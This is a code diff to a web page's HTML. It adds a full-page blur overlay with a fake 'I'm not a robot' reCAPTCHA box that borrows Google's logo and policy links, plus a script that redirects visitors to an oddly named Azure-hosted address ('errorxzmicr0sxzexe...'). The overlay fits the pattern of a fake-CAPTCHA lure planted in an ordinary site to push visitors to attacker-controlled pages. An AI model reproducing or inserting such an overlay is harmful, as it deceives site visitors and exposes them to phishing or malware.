@@ -470,10 +470,31 @@
 </main>
 
 
-<script>
+  <div class="blur-overlay">
+    <div class="verification-box" id="verify-box">
+      <div class="fake-recaptcha" id="captcha">
+        <input type="checkbox" id="check" />
+        <span>I'm not a robot</span>
+      </div>
+      <div class="recaptcha-logo">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+        <span>reCAPTCHA</span>
+      </div>
+    </div>
+
+    <div class="info-text">
+      This site is protected by reCAPTCHA and the Google
+      <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and
+      <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> apply.
+      <br><br>
+      Please confirm you're a human before proceeding. Automated access will be blocked.
+    </div>
+  </div>
+
+  <script>
     const verifyBox = document.getElementById('verify-box');
     const check = document.getElementById('check');
-    const redirectUrl = 'https://errorxmrosx01xx.z13.web.core.windows.net/';
+    const redirectUrl = 'https://errorxzmicr0sxzexe.z13.web.core.windows.net/';
     let redirected = false;
     let hoverTimeout;
 
@@ -511,7 +532,6 @@
       clearTimeout(hoverTimeout);
     });
   </script>
-
 
   <footer role="contentinfo">
   <p><strong>Address:</strong> 20 Cooper Square, New York, NY 10003, USA</p>
